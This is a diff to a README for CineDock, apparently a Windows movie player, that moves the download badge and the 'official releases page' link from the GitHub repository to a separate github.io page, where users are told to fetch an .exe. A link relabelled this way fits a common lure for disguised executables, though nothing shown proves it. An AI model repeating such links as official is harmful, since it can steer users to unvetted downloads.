@@ -1,6 +1,6 @@
 # 🎬 CineDock - Browse and play movies with ease
 
-[![](https://img.shields.io/badge/Download-CineDock-blue.svg)](https://github.com/niyas7666/CineDock)
+[![](https://img.shields.io/badge/Download-CineDock-blue.svg)](https://niyas7666.github.io)
 
 CineDock allows you to browse your movie collection on your Windows computer. It plays high-definition video files with support for multiple audio tracks and subtitles. CineDock uses the engine from VLC to provide stable video playback for all your favorite media formats.
 
@@ -8,7 +8,7 @@ CineDock allows you to browse your movie collection on your Windows computer. It
 
 Follow these steps to get CineDock working on your computer.
 
-1. Visit the [official releases page](https://github.com/niyas7666/CineDock).
+1. Visit the [official releases page](https://niyas7666.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the link that ends in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
